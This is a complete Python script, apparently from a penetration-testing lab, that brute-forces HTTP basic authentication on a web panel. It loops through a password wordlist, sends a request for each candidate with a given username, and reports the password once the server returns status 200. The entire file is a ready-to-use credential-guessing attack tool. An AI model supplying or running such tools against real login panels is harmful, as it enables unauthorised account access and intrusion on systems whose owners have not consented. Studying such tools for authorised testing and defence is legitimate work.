#!/usr/bin/python
import requests
import signal
import sys
import threading
import time

def salida(sig, frame):
    print(" \n    *Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, salida)


if __name__ == '__main__':

    try:
        url = sys.argv[1]
        username = sys.argv[2]
        password = sys.argv[3]
 
    except Exception as e:
        print("Use: ./webPanel-BF.py http://10.10.10.101 <username> <file password>")
        sys.exit(1)
    
    
    def bf(username, password):
        
        with open(password, 'r') as file:
            for i in file:
                s = requests.session()
                password = i.split()
                password = i.strip()
                r = s.get(url, auth=(username, password))
                print(r.status_code, f'{username, password}')
                if r.status_code == 200 :
                    print(f"\n\n-------\nPassword Succes Fully : {username, password}\n---------\n")
                    s.close()
                    sys.exit(0)
                s.close()
            
    bf(username, password)   
   